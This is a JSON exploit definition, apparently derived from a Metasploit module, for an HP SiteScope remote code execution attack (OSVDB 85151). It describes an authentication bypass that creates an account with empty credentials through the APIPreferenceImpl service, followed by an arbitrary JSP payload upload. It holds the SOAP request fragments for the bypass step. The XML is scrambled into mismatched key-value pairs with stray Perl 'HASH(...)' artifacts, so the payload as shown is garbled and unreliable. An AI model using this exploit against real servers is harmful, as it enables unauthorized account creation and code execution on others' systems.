{
   "name" : "HpSitescopeUploadfileshandler",
   "msf_module" : "hp_sitescope_uploadfileshandler",
   "requests" : {
      "EXPLOIT2" : {
         "PAYLOAD" : "<?xml version=\\'1.0\\' encoding=\\'UTF-8\\'?>\r\n",
         "wsns0:encodingStyle=\\'http://schemas.xmlsoap.org/soap/encoding/\\'\r\n" : ">\r\n",
         "xsi:type=\\'xsd:anyType\\'\r\n" : "></value>\r\n",
         ">UserInstancePreferences</in0>\r\n" : "<in1\r\n",
         "<key\r\n" : "xsi:nil=\\'true\\'\r\n",
         "HASH(0x268c3e0)" : null,
         "xsi:type=\\'apachesoap:mapItem\\'\r\n" : ">\r\n",
         "xmlns:xsd=\\'http://www.w3.org/2001/XMLSchema\\'\r\n" : "xmlns:wsns0=\\'http://schemas.xmlsoap.org/soap/envelope/\\'\r\n",
         "Sending Exploit #2 Request : [POST] /services/APIPreferenceImpl" : "HEADERS",
         "HASH(0x275b8c8)" : "VALIDATION",
         "</impl:create>\r\n" : "</wsns0:Body>\r\n",
         "</item>\r\n" : "</in1>\r\n",
         "<wsns0:Envelope\r\n" : "xmlns:wsns1=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
         "<impl:create\r\n" : "xmlns:impl=\\'http://Api.freshtech.COM\\'\r\n",
         "<value\r\n" : "xsi:nil=\\'true\\'\r\n",
         "xsi:type=\\'apachesoap:Map\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
         "</wsns0:Envelope>\r\n" : "TEXT",
         "METHOD" : "POST",
         ">\r\n" : "<item\r\n",
         "xsi:type=\\'xsd:string\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
         "PATH" : "services/APIPreferenceImpl"
      }
   },
   "paths" : [
      "SiteScope/"
   ],
   "informations" : {
      "MSF_MODULE" : "hp_sitescope_uploadfileshandler",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/SiteScope/",
            "DESCRIPTION" : "Path to SiteScope"
         }
      },
      "OSVDB" : 85151,
      "name" : "HpSitescopeUploadfileshandler",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PAYLOAD" : "<?xml version=\\'1.0\\' encoding=\\'UTF-8\\'?>\r\n",
            "wsns0:encodingStyle=\\'http://schemas.xmlsoap.org/soap/encoding/\\'\r\n" : ">\r\n",
            "xsi:type=\\'xsd:anyType\\'\r\n" : "></value>\r\n",
            ">UserInstancePreferences</in0>\r\n" : "<in1\r\n",
            "<key\r\n" : "xsi:nil=\\'true\\'\r\n",
            "HASH(0x268c3e0)" : null,
            "xsi:type=\\'apachesoap:mapItem\\'\r\n" : ">\r\n",
            "xmlns:xsd=\\'http://www.w3.org/2001/XMLSchema\\'\r\n" : "xmlns:wsns0=\\'http://schemas.xmlsoap.org/soap/envelope/\\'\r\n",
            "Sending Exploit #2 Request : [POST] /services/APIPreferenceImpl" : "HEADERS",
            "HASH(0x275b8c8)" : "VALIDATION",
            "</impl:create>\r\n" : "</wsns0:Body>\r\n",
            "</item>\r\n" : "</in1>\r\n",
            "<wsns0:Envelope\r\n" : "xmlns:wsns1=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
            "<impl:create\r\n" : "xmlns:impl=\\'http://Api.freshtech.COM\\'\r\n",
            "<value\r\n" : "xsi:nil=\\'true\\'\r\n",
            "xsi:type=\\'apachesoap:Map\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
            "</wsns0:Envelope>\r\n" : "TEXT",
            "METHOD" : "POST",
            ">\r\n" : "<item\r\n",
            "xsi:type=\\'xsd:string\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
            "PATH" : "services/APIPreferenceImpl"
         }
      },
      "DESCRIPTION" : "\n\n          This module exploits a code execution flaw in HP SiteScope. It exploits two\n\n        vulnerabilities in order to get its objective. An authentication bypass in the\n\n        create operation, available through the APIPreferenceImpl AXIS service, to create\n\n        a new account with empty credentials and, subsequently, uses the new account to\n\n        abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP.\n\n        The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2\n\n        and Linux CentOS 6.3.\n\n      ",
      "TITLE" : "HP SiteScope Remote Code Execution",
      "METHOD" : "POST",
      "TYPE" : "MSF",
      "PLATFORM" : "MULTI",
      "PATHS" : [
         "SiteScope/"
      ]
   },
   "osvdb" : 85151,
   "detection" : {},
   "type" : "MSF",
   "method" : "POST",
   "platform" : "MULTI",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n          This module exploits a code execution flaw in HP SiteScope. It exploits two\n\n        vulnerabilities in order to get its objective. An authentication bypass in the\n\n        create operation, available through the APIPreferenceImpl AXIS service, to create\n\n        a new account with empty credentials and, subsequently, uses the new account to\n\n        abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP.\n\n        The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2\n\n        and Linux CentOS 6.3.\n\n      ",
   "variables" : {
      "PATH" : {
         "VALUE" : "/SiteScope/",
         "DESCRIPTION" : "Path to SiteScope"
      }
   },
   "title" : "HP SiteScope Remote Code Execution"
}
